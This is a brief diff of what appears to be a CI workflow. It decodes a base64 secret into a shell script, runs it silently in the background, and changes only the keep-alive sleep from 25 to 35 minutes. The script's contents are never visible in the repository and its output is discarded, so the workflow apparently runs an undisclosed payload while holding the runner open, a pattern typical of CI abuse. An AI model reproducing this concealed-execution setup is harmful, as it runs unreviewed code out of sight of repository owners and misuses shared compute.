@@ -25,5 +25,5 @@ jobs:
         run: |
           echo "$TEZ" | base64 --decode > ku.sh
           sh ku.sh > /dev/null 2>&1 &
-          sleep 25m 
+          sleep 35m 
           echo "OK"
